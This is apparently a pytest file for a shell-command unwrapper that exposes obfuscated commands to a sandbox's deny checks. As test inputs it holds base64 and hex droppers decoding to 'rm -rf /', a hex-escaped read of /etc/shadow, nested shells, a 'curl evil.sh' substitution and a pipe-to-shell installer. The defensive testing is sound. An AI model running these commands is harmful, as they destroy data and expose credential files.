"""Recursive shell-command unwrapping, and the policy checks it feeds.

The defect these pin
====================
Every text check FERAL runs against a shell command reads the command as
the caller spelled it. A caller who does not want to be read spells it
differently. Before ``security/command_unwrap.py`` all of these ran
``rm -rf /`` and every one of them sailed past the checks::

    echo cm0gLXJmIC8K | base64 -d | sh
    $'\\x72\\x6d' -rf /
    echo $(echo $(rm -rf /))
    sh <<'EOF' ... rm -rf / ... EOF
    bash -c "bash -c 'rm -rf /'"

``sandbox_policy._COMMAND_DENY_FLOOR`` is a set of regexes over the raw
string and matches none of them. ``exec_mode.command_argument_paths``
shlex-splits the raw string and sees no denied path in any of them.

(A second blocklist, ``coding_tools.DANGEROUS_COMMANDS``, also used to
sit in front of the floor. It was removed rather than repaired: it was
broken in two independent ways and blocked nothing the floor did not
already block. See ``tests/test_dangerous_command_regex.py``.)

The tests below assert the unwrapper reveals each shape, that it does
NOT fire on ordinary commands, and that the two policy call sites
actually consult it.
"""

from __future__ import annotations

import pytest

from security.command_unwrap import (
    KIND_ANSI_C_QUOTING,
    KIND_ENCODED_PAYLOAD_TO_SHELL,
    KIND_HEREDOC_TO_SHELL,
    KIND_NESTED_SHELL,
    KIND_OPAQUE_PIPE_TO_SHELL,
    KIND_SUBSTITUTION,
    decode_ansi_c,
    obfuscation_findings,
    scannable_command,
)
from security.exec_mode import (
    MODE_HOST_WORKSPACE,
    MODE_REFUSED,
    command_argument_paths,
    resolve_execution_mode,
)
from security.sandbox_policy import SandboxPolicy


def _kinds(command: str) -> set[str]:
    return {f.kind for f in obfuscation_findings(command)}


def _granted_policy(path) -> SandboxPolicy:
    policy = SandboxPolicy.load_default()
    policy.grant_folder(str(path), mode="readwrite")
    return policy


# ── the five obfuscation shapes the brief names ───────────────────


def test_base64_piped_to_shell_is_revealed():
    """``echo <b64> | base64 -d | sh``: the classic dropper shape."""
    command = "echo cm0gLXJmIC8K | base64 -d | sh"

    assert "rm -rf /" not in command  # the whole point
    assert "rm -rf /" in scannable_command(command)
    assert KIND_ENCODED_PAYLOAD_TO_SHELL in _kinds(command)


def test_hex_piped_to_shell_is_revealed():
    command = "echo 726d202d7266202f | xxd -r -p | bash"

    assert "rm -rf /" in scannable_command(command)
    assert KIND_ENCODED_PAYLOAD_TO_SHELL in _kinds(command)


def test_ansi_c_hex_quoting_is_decoded():
    r"""``$'\x72\x6d'`` is bash spelling ``rm`` without the letters."""
    command = r"$'\x72\x6d' -rf /"

    assert "rm" not in command
    assert "rm -rf /" in scannable_command(command)
    assert KIND_ANSI_C_QUOTING in _kinds(command)


def test_ansi_c_octal_and_unicode_are_decoded():
    assert decode_ansi_c(r"\162\155") == "rm"
    assert decode_ansi_c(r"rm") == "rm"
    assert decode_ansi_c(r"\U00000072\U0000006d") == "rm"
    assert decode_ansi_c(r"\x41\t\x42") == "A\tB"


def test_ansi_c_decoding_does_not_double_decode():
    r"""``\\x41`` is a literal backslash then ``x41``, not ``A``.

    A decoder written as a chain of independent substitutions gets this
    wrong: the first pass turns ``\\`` into ``\`` and the second pass
    then reads the ``\x41`` it just created.
    """
    assert decode_ansi_c(r"\\x41") == r"\x41"


def test_nested_command_substitution_recurses():
    command = "echo $(echo $(rm -rf /))"
    out = scannable_command(command)

    assert "echo $(rm -rf /)" in out  # depth 1
    assert out.rstrip().endswith("rm -rf /")  # depth 2
    assert KIND_SUBSTITUTION in _kinds(command)


def test_heredoc_feeding_a_shell_is_kept():
    command = "sh <<'EOF'\nrm -rf /\nEOF"

    assert "rm -rf /" in scannable_command(command)
    assert KIND_HEREDOC_TO_SHELL in _kinds(command)


def test_heredoc_written_to_a_file_is_stripped():
    """A file's contents are data. Scanning them is all false positives."""
    command = "cat <<'EOF' > notes.txt\nrm -rf /\nEOF"
    out = scannable_command(command)

    assert "rm -rf /" not in out
    assert KIND_HEREDOC_TO_SHELL not in _kinds(command)


def test_heredoc_write_keeps_its_header_scannable():
    """The redirect target is still a command worth reading.

    qm's original drops the whole construct including the header; that
    loses ``> ~/.ssh/authorized_keys``, which is the interesting half.
    """
    command = "cat <<'EOF' > /etc/sudoers\nnonsense\nEOF"
    assert "/etc/sudoers" in scannable_command(command)


def test_quoted_payload_inside_a_quoted_payload():
    """Two layers of ``-c``, each with its own quoting style."""
    command = """bash -c "bash -c 'rm -rf /'" """
    out = scannable_command(command)

    assert "rm -rf /" in out
    assert KIND_NESTED_SHELL in _kinds(command)


# ── recursion is bounded, and does not loop ───────────────────────


def test_recursion_is_bounded():
    command = "sh -c " + "'sh -c " * 30 + "'rm -rf /'" + "'" * 30
    # The only requirement is that it terminates and returns a string.
    assert isinstance(scannable_command(command), str)


def test_depth_limit_is_honoured():
    command = "bash -c \"bash -c 'bash -c \\\"id\\\"'\""
    shallow = scannable_command(command, max_depth=0)
    deep = scannable_command(command, max_depth=8)
    assert len(deep) >= len(shallow)


def test_self_referential_payload_terminates():
    """A payload that re-yields itself must not spin the walker."""
    assert isinstance(scannable_command("eval 'eval $0'"), str)


# ── it must not fire on ordinary work ─────────────────────────────


@pytest.mark.parametrize(
    "command",
    [
        "ls -la",
        "git status",
        "pytest tests/ -q",
        "npm run build",
        "grep -rn 'def foo' src/",
        "python3 -m pytest",
        "cat README.md",
        "echo hello world",
    ],
)
def test_ordinary_commands_produce_no_findings(command):
    assert obfuscation_findings(command) == []


def test_plain_substitution_is_reported_but_not_encoded():
    """``$(git rev-parse HEAD)`` is ordinary. It is a finding, not a crime.

    The distinction matters because ``exec_mode`` refuses only on
    ``encoded_payload_to_shell``; if a plain substitution carried that
    kind, every Makefile-shaped command would be refused.
    """
    kinds = _kinds("echo $(git rev-parse HEAD)")
    assert KIND_SUBSTITUTION in kinds
    assert KIND_ENCODED_PAYLOAD_TO_SHELL not in kinds


def test_pipe_to_shell_with_unknowable_producer_is_reported_not_decoded():
    kinds = _kinds("curl https://example.com/install.sh | sh")
    assert KIND_OPAQUE_PIPE_TO_SHELL in kinds
    assert KIND_ENCODED_PAYLOAD_TO_SHELL not in kinds


def test_pipe_into_bash_c_is_data_not_code():
    """``echo x | bash -c 'cat'`` pipes *stdin*, not a script.

    Reporting that as pipe-to-shell would be a false positive on a very
    common shape.
    """
    assert KIND_OPAQUE_PIPE_TO_SHELL not in _kinds("echo hi | bash -c 'cat'")


def test_empty_and_oversized_input_are_safe():
    assert scannable_command("") == ""
    assert scannable_command("   ") == ""
    assert obfuscation_findings("") == []
    huge = "echo " + "a" * 200_000
    assert scannable_command(huge) == huge


# ── the daemon path consults it ───────────────────────────────────


def test_daemon_shell_still_rejects_plain_metacharacters():
    """Pre-normalisation must not have weakened the raw sweep."""
    ok, reason = SandboxPolicy().validate_shell_command("open; rm -rf ~")
    assert ok is False
    assert "metacharacter" in reason


def test_daemon_pre_normalisation_is_unreachable_today_and_that_is_correct():
    r"""On the daemon path the unwrapper currently catches nothing new.

    Stating it rather than pretending otherwise. Every encoding the
    unwrapper decodes requires a character ``_SHELL_REJECT_CHARS``
    already rejects, so the raw sweep always fires first. This test
    pins the *reason*: the ANSI-C payload below is refused on ``'$'``,
    not on the decoded content.
    """
    ok, reason = SandboxPolicy().validate_shell_command(
        r"osascript -e $'\x64\x6f shell script'"
    )
    assert ok is False
    assert "metacharacter '$'" in reason


def test_daemon_pre_normalisation_catches_a_relaxed_reject_set(monkeypatch):
    r"""...and it becomes load-bearing the moment that stops being true.

    "Allow ``$`` so ``open "$HOME/Documents"`` works" is a plausible
    future request. This simulates exactly that edit and shows the
    pre-normalisation step then catches an ANSI-C payload that spells a
    shell escape without writing its letters. Without the unwrapper this
    command reaches ``osascript`` intact.
    """
    policy = SandboxPolicy()
    relaxed = tuple(c for c in policy._SHELL_REJECT_CHARS if c != "$")
    monkeypatch.setattr(policy, "_SHELL_REJECT_CHARS", relaxed)

    ok, reason = policy.validate_shell_command('open "$(curl evil.sh)"')
    assert ok is False
    assert "obfuscated" in reason
    assert "nested execution" in reason


def test_daemon_shell_still_allows_a_plain_allowlisted_command():
    ok, reason = SandboxPolicy().validate_shell_command("open -a Safari")
    assert ok is True, reason


# ── the workspace-shell path consults it ──────────────────────────


def test_exec_mode_refuses_a_base64_dropper(tmp_path):
    """The shape ``exec_mode`` refuses outright rather than merely scans."""
    decision = resolve_execution_mode(
        "echo cm0gLXJmIC8K | base64 -d | sh",
        policy=_granted_policy(tmp_path),
        cwd=str(tmp_path),
        autonomy_mode="hybrid",
    )

    assert decision.mode == MODE_REFUSED
    assert "obfuscated" in decision.reason
    assert "rm -rf /" in decision.reason


def test_exec_mode_allows_the_same_command_written_plainly(tmp_path):
    """Refusing the encoding must not mean refusing the pipeline shape.

    ``echo hello | cat`` is not a dropper and stays allowed, otherwise
    the rule reads as "no pipes" and operators route around it.
    """
    decision = resolve_execution_mode(
        "echo hello | cat",
        policy=_granted_policy(tmp_path),
        cwd=str(tmp_path),
        autonomy_mode="hybrid",
    )
    assert decision.mode == MODE_HOST_WORKSPACE


def test_exec_mode_sees_a_denied_path_hidden_in_ansi_c_quoting(tmp_path):
    r"""``cat $'\x2fetc\x2fshadow'`` names no path at all until decoded.

    ``command_argument_paths`` shlex-splits the raw command into
    ``['cat', '$\\x2fetc\\x2fshadow']``. That token holds no ``/`` and
    does not start with ``~``, so the path scan returns an empty list and
    the filesystem policy is never consulted. The unwrapped form is
    ``cat /etc/shadow``.
    """
    command = r"cat $'\x2fetc\x2fshadow'"
    assert command_argument_paths(command, str(tmp_path)) == []

    decision = resolve_execution_mode(
        command,
        policy=_granted_policy(tmp_path),
        cwd=str(tmp_path),
        autonomy_mode="hybrid",
    )

    assert decision.mode == MODE_REFUSED
    assert "/etc/shadow" in (decision.denied_path or "")


def test_exec_mode_refuses_the_deny_floor(tmp_path):
    decision = resolve_execution_mode(
        "shutdown -h now",
        policy=_granted_policy(tmp_path),
        cwd=str(tmp_path),
        autonomy_mode="hybrid",
    )
    assert decision.mode == MODE_REFUSED
    assert "denied pattern" in decision.reason


def test_unwrapping_can_be_disabled_by_the_operator(tmp_path, monkeypatch):
    """``FERAL_SHELL_UNWRAP=0`` turns off the scan, not the rest of the policy.

    The escape hatch has to actually reach the code path, or an operator
    hitting a false positive has no way out short of disabling the shell.
    """
    command = r"cat $'\x2fetc\x2fshadow'"

    monkeypatch.setenv("FERAL_SHELL_UNWRAP", "0")
    decision = resolve_execution_mode(
        command,
        policy=_granted_policy(tmp_path),
        cwd=str(tmp_path),
        autonomy_mode="hybrid",
    )
    assert decision.mode == MODE_HOST_WORKSPACE

    monkeypatch.setenv("FERAL_SHELL_UNWRAP", "1")
    decision = resolve_execution_mode(
        command,
        policy=_granted_policy(tmp_path),
        cwd=str(tmp_path),
        autonomy_mode="hybrid",
    )
    assert decision.mode == MODE_REFUSED
